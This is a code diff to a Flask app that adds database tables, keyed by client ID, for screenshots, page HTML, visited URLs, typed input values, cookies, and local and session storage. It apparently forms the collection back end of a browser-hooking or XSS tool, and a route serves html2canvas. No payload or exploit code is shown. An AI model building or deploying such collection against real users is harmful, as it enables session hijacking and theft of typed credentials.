@@ -81,6 +81,84 @@ class Client(db.Model):
         return f'<Client {self.id}>'
 
 
+# Not finished
+class Screenshot(db.Model):
+    id        = db.Column(db.String(100), primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    url       = db.Column(db.String(100), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+    # Not sure how to handle images yet
+    # https://sqlalchemy-imageattach.readthedocs.io/en/1.0.0/
+    # https://stackoverflow.com/questions/34154660/correct-way-to-declare-an-image-field-sqlalchemy
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class HtmlCode(db.Model):
+    id        = db.Column(db.String(100), primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    url       = db.Column(db.String(100), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+    code      = db.Column(db.Text)
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class UrlVisited(db.Model):
+    id        = db.Column(db.String(100), primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    url       = db.Column(db.String(100), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class UserInput(db.Model):
+    id         = db.Column(db.String(100), primary_key=True)
+    clientID   = db.Column(db.String(100), nullable=False)
+    inputName  = db.Column(db.String(100), nullable=False)
+    inputValue = db.Column(db.String(100), nullable=False)
+    timeStamp  = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class Cookie(db.Model):
+    id          = db.Column(db.String(100), primary_key=True)
+    clientID    = db.Column(db.String(100), nullable=False)
+    cookieName  = db.Column(db.String(100), nullable=False)
+    cookieValue = db.Column(db.String(100), nullable=False)
+    timeStamp   = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class LocalStorage(db.Model):
+    id        = db.Column(db.String(100), primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    key       = db.Column(db.String(100), nullable=False)
+    value     = db.Column(db.String(100), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
+
+class SessionStorage(db.Model):
+    id        = db.Column(db.String(100), primary_key=True)
+    clientID  = db.Column(db.String(100), nullable=False)
+    key       = db.Column(db.String(100), nullable=False)
+    value     = db.Column(db.String(100), nullable=False)
+    timeStamp = db.Column(db.DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<Client {self.id}>'
+
 #***************************************************************************
 # Support Functions
 
@@ -178,13 +256,6 @@ def sendHtml2Canvas():
         response.mimetype = 'text/javascript'
 
         return response
-
-# Send copy of jszip
-# @app.route('/lib/compress.js', methods=['GET'])
-# def sendJsZip():
-#     with open('./jszip.min.js', 'rb') as file:
-#         return file.read(), 200
-
 
 
 
